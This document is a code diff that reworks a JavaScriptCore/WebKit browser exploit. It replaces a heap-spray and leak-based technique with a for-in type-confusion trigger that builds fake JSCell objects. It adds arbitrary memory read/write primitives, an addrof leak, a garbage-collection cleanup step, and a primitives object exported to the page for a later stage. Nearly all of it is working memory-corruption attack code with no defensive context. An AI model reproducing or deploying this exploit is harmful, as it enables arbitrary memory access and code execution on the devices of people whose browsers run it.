@@ -1,35 +1,19 @@
-function makeid() {
-    var text = "";
-    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+function zeroFill(number, width) {
+    width -= number.toString().length;
 
-    for (var i = 0; i < 8; i++)
-        text += possible.charAt(Math.floor(Math.random() * possible.length));
-
-    return text;
-};
-
-var instancespr = [];
-
-for (var i = 0; i < 4096; i++) {
-    instancespr[i] = new Uint32Array(1);
-    instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
-}
-
-var _dview;
-
-function u2d(low, hi) {
-    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
-    _dview.setUint32(0, hi);
-    _dview.setUint32(4, low);
-    return _dview.getFloat64(0);
-}
-var dgc = function () {
-    for (var i = 0; i < 0x100; i++) {
-        new ArrayBuffer(0x100000);
+    if (width > 0) {
+        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
     }
+
+    return number + ""; // always return a string
 }
 
 function int64(low, hi) {
+    var conversionBuf = new ArrayBuffer(0x100);
+    var u32 = new Uint32Array(conversionBuf);
+    var f64 = new Float64Array(conversionBuf);
+
+
     this.low = (low >>> 0);
     this.hi = (hi >>> 0);
 
@@ -43,7 +27,7 @@ function int64(low, hi) {
 
         this.hi = new_hi;
         this.low = new_lo;
-    }
+    };
 
     this.add32 = function (val) {
         var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
@@ -54,7 +38,7 @@ function int64(low, hi) {
         }
 
         return new int64(new_lo, new_hi);
-    }
+    };
 
     this.sub32 = function (val) {
         var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
@@ -65,7 +49,7 @@ function int64(low, hi) {
         }
 
         return new int64(new_lo, new_hi);
-    }
+    };
 
     this.sub32inplace = function (val) {
         var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
@@ -77,19 +61,19 @@ function int64(low, hi) {
 
         this.hi = new_hi;
         this.low = new_lo;
-    }
+    };
 
     this.and32 = function (val) {
         var new_lo = this.low & val;
         var new_hi = this.hi;
         return new int64(new_lo, new_hi);
-    }
+    };
 
     this.and64 = function (vallo, valhi) {
         var new_lo = this.low & vallo;
         var new_hi = this.hi & valhi;
         return new int64(new_lo, new_hi);
-    }
+    };
 
     this.toString = function (val) {
         val = 16;
@@ -102,231 +86,258 @@ function int64(low, hi) {
             lo_str = zeroFill(lo_str, 8)
 
         return hi_str + lo_str;
-    }
+    };
 
     this.toPacked = function () {
         return {
             hi: this.hi,
             low: this.low
         };
-    }
+    };
 
     this.setPacked = function (pck) {
         this.hi = pck.hi;
         this.low = pck.low;
         return this;
-    }
+    };
+    this.u2d = function () {
+        u32[0] = this.low;
+        u32[1] = this.hi;
+
+        return f64[0];
+    };
+    this.asJSValue = function () {
+        u32[0] = this.low;
+        u32[1] = this.hi - 0x10000;
+        return f64[0];
+    };
 
     return this;
 }
 
-function zeroFill(number, width) {
-    width -= number.toString().length;
+var STRUCTURE_SPRAY_SIZE = 0x1800;
 
-    if (width > 0) {
-        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
+var g_confuse_obj = null;
+var g_arb_master = null;
+var g_arb_slave = new Uint32Array(0x1000);
+var g_leaker = {};
+var g_leaker_addr = null;
+var g_structure_spray = [];
+
+var dub = new int64(0x41414141, 0x41414141).u2d();
+var g_inline_obj = {
+    a: dub,
+    b: dub,
+};
+
+function spray_structs() {
+    for (var i = 0; i < STRUCTURE_SPRAY_SIZE; i++) {
+        var a = new Uint32Array(0x1);
+        a["p" + i] = 0x1337;
+        g_structure_spray.push(a); // keep the Structure objects alive.
     }
 
-    return number + ""; // always return a string
 }
 
-var nogc = [];
-
-var fail = function () {
-    alert.apply(null, arguments);
-    throw "fail";
-}
-
-// Target JSObject for overlap
-var tgt = {
-    a: 0,
-    b: 0,
-    c: 0,
-    d: 0
-}
-
-var y = new ImageData(1, 0x4000)
-postMessage("", "*", [y.data.buffer]);
-
-// Spray properties to ensure object is fastmalloc()'d and can be found easily later
-var props = {};
-
-for (var i = 0;
-    (i < (0x4000 / 2));) {
-    props[i++] = {
-        value: 0x42424242
+function trigger() {
+    var o = {
+        'a': 1
     };
-    props[i++] = {
-        value: tgt
+    var test = new ArrayBuffer(0x100000);
+    g_confuse_obj = {};
+    var cell = {
+        js_cell_header: new int64(0x00000800, 0x01182700).asJSValue(),
+        butterfly: false, // Some arbitrary value
+        vector: g_inline_obj,
+        len_and_flags: (new int64(0x00000020, 0x00010001)).asJSValue()
     };
-}
+    g_confuse_obj[0 + "a"] = cell;
 
-var foundLeak = undefined;
-var foundIndex = 0;
-var maxCount = 0x100;
+    g_confuse_obj[1 + "a"] = {};
+    g_confuse_obj[1 + "b"] = {};
+    g_confuse_obj[1 + "c"] = {};
+    g_confuse_obj[1 + "d"] = {};
 
-while (foundLeak == undefined && maxCount > 0) {
-    maxCount--;
 
-    history.pushState(y, "");
+    for (var j = 0x5; j < 0x20; j++) {
+        g_confuse_obj[j + "a"] = new Uint32Array(test);
+    }
+    for (var k in o) {
+        {
+            k = {
+                a: g_confuse_obj,
+                b: new ArrayBuffer(test.buffer),
+                c: new ArrayBuffer(test.buffer),
+                d: new ArrayBuffer(test.buffer),
+                e: new ArrayBuffer(test.buffer),
+                1: new ArrayBuffer(test.buffer),
 
-    Object.defineProperties({}, props);
+            };
 
-    var leak = new Uint32Array(history.state.data.buffer);
+            function k() {
+                return k;
+            }
 
-    for (var i = 0; i < leak.length - 6; i++) {
-        if (
-            leak[i] == 0x42424242 &&
-            leak[i + 0x1] == 0xFFFF0000 &&
-            leak[i + 0x2] == 0x00000000 &&
-            leak[i + 0x3] == 0x00000000 &&
-            leak[i + 0x4] == 0x00000000 &&
-            leak[i + 0x5] == 0x00000000 &&
-            leak[i + 0x6] == 0x0000000E &&
-            leak[i + 0x7] == 0x00000000 &&
-            leak[i + 0xA] == 0x00000000 &&
-            leak[i + 0xB] == 0x00000000 &&
-            leak[i + 0xC] == 0x00000000 &&
-            leak[i + 0xD] == 0x00000000 &&
-            leak[i + 0xE] == 0x0000000E &&
-            leak[i + 0xF] == 0x00000000
-        ) {
-            foundIndex = i;
-            foundLeak = leak;
-            break;
+        }
+
+        o[k];
+
+        if (g_confuse_obj["0a"] instanceof Uint32Array) {
+            return;
         }
     }
 }
 
-if (!foundLeak) {
-    failed = true
-    fail("Failed to find leak!")
+function setup_arb_rw() {
+    var jsCellHeader = new int64(0x00000800, 0x01182700);
+    g_fake_container = {
+        jsCellHeader: jsCellHeader.asJSValue(),
+        butterfly: false, // Some arbitrary value
+        vector: g_arb_slave,
+        lengthAndFlags: (new int64(0x00000020, 0x00010000)).asJSValue()
+    };
+
+    g_inline_obj.a = g_fake_container;
+    g_confuse_obj["0a"][0x4] += 0x10;
+    g_arb_master = g_inline_obj.a;
+    g_arb_master[0x6] = 0xFFFFFFF0;
 }
 
-var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
-var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
+function read(addr, length) {
+    var a = new Uint8Array(length);
+    for (var i = 0; i < length; i++) {
+        a[i] = read8(addr.add32(i)).low & 0xFF;
+    }
+    return a;
+}
 
-Array.prototype.__defineGetter__(100, () => 1);
+function read8(addr) {
+    if (!(addr instanceof int64))
+        addr = new int64(addr);
 
-var f = document.body.appendChild(document.createElement('iframe'));
-var a = new f.contentWindow.Array(13.37, 13.37);
-var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
+    g_arb_master[4] = addr.low;
+    g_arb_master[5] = addr.hi;
 
-var master = new Uint32Array(0x1000);
-var slave = new Uint32Array(0x1000);
-var leakval_u32 = new Uint32Array(0x1000);
-var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+    var retval = new int64(g_arb_slave[0] & 0xFF, 0);
+    return retval;
+}
 
-// Create fake ArrayBufferView
-tgt.a = u2d(2048, 0x1602300);
-tgt.b = 0;
-tgt.c = leakval_helper;
-tgt.d = 0x1337;
+function read32(addr) {
+    if (!(addr instanceof int64))
+        addr = new int64(addr);
 
-var c = Array.prototype.concat.call(a, b);
-document.body.removeChild(f);
-var hax = c[0];
-c[0] = 0;
+    g_arb_master[4] = addr.low;
+    g_arb_master[5] = addr.hi;
 
-tgt.c = c;
+    var retval = g_arb_slave[0];
+    return retval;
+}
 
-hax[2] = 0;
-hax[3] = 0;
+function read64(addr) {
+    if (!(addr instanceof int64))
+        addr = new int64(addr);
 
-Object.defineProperty(Array.prototype, 100, {
-    get: undefined
-});
+    g_arb_master[4] = addr.low;
+    g_arb_master[5] = addr.hi;
 
-tgt.c = leakval_helper;
-var butterfly = new int64(hax[2], hax[3]);
-butterfly.low += 0x10;
+    var retval = new int64(g_arb_slave[0], g_arb_slave[1]);
 
-tgt.c = leakval_u32;
-var lkv_u32_old = new int64(hax[4], hax[5]);
-hax[4] = butterfly.low;
-hax[5] = butterfly.hi;
-// Setup read/write primitive
+    return retval;
+}
 
-tgt.c = master;
-hax[4] = leakval_u32[0];
-hax[5] = leakval_u32[1];
-var slave_ptr_ptr = new int64(hax[4], hax[5]);
-var addr_to_slavebuf = new int64(master[4], master[5]);
-tgt.c = leakval_u32;
-hax[4] = lkv_u32_old.low;
-hax[5] = lkv_u32_old.hi;
+function write(addr, data) {
+    addr_ = addr.add32(0);
+    for (var i = 0; i < data.length; i++) {
+        write8(addr_, data[i]);
+        addr_.add32inplace(i);
+    }
+}
 
-tgt.c = 0;
-hax = 0;
+function write8(addr, val) {
+
+    g_arb_master[4] = addr.low;
+    g_arb_master[5] = addr.hi;
+    var tmp = g_arb_slave[0] & 0xFFFFFF00;
+    g_arb_slave[0] = val | tmp;
+}
+
+function write32(addr, val) {
+
+    g_arb_master[4] = addr.low;
+    g_arb_master[5] = addr.hi;
+
+    g_arb_slave[0] = val;
+}
+
+function write64(addr, val) {
+    if (!(val instanceof int64))
+        val = new int64(val);
+
+    g_arb_master[4] = addr.low;
+    g_arb_master[5] = addr.hi;
+    g_arb_slave[0] = val.low;
+    g_arb_slave[1] = val.hi;
+}
+
+function setup_obj_leaks() {
+    g_leaker.leak = false;
+    g_inline_obj.a = g_leaker;
+    g_leaker_addr = new int64(g_confuse_obj["0a"][4], g_confuse_obj["0a"][5]).add32(0x10);
+}
+
+function addrof(obj) {
+    g_leaker.leak = obj;
+    return read64(g_leaker_addr);
+}
+
+function cleanup() {
+
+
+    var u32array = new Uint32Array(8);
+    header = read(addrof(u32array), 0x10);
+
+    // Set length to 0x10 and flags to 0x1
+    // Will behave as OversizeTypedArray which can survive gc easily
+    write32(addrof(g_arb_master).add32(0x18), 0x10);
+    write32(addrof(g_arb_master).add32(0x1C), 0x1); //
+    write32(addrof(g_confuse_obj['0a']).add32(0x18), 0x10);
+    write32(addrof(g_confuse_obj['0a']).add32(0x1C), 0x1);
+    write32(addrof(g_arb_slave).add32(0x1C), 0x1);
+    var empty = {};
+    header = read(addrof(empty), 0x8);
+    write(addrof(g_fake_container), header);
+}
+
+function start_exploit() {
+    spray_structs();
+    trigger();
+    setup_arb_rw();
+    setup_obj_leaks();
+}
+
+start_exploit();
 
 var prim = {
     write8: function (addr, val) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        if (val instanceof int64) {
-            slave[0] = val.low;
-            slave[1] = val.hi;
-        } else {
-            slave[0] = val;
-            slave[1] = 0;
-        }
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
+        write64(addr, val);
     },
 
     write4: function (addr, val) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        slave[0] = val;
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
+        write32(addr, val);
     },
 
     read8: function (addr) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        var rtv = new int64(slave[0], slave[1]);
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-
-        return rtv;
+        return read64(addr);
     },
 
     read4: function (addr) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        var rtv = slave[0];
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-
-        return rtv;
+        return read32(addr);
     },
 
     leakval: function (jsval) {
-        leakval_helper[0] = jsval;
-        var rtv = this.read8(butterfly);
-        this.write8(butterfly, new int64(0x41414141, 0xffff0000));
-
-        return rtv;
+        return addrof(jsval);
     },
-
-    createval: function (jsval) {
-        this.write8(butterfly, jsval);
-        var rt = leakval_helper[0];
-        this.write8(butterfly, new int64(0x41414141, 0xffff0000));
-        return rt;
-    }
 };
-prim.write4(prim.leakval(master).add32(0x18), 0x18);
-prim.write4(slave_ptr_ptr.add32(0x18), 0x2);
 
 window.primitives = prim;
 if (window.postExpl) window.postExpl();
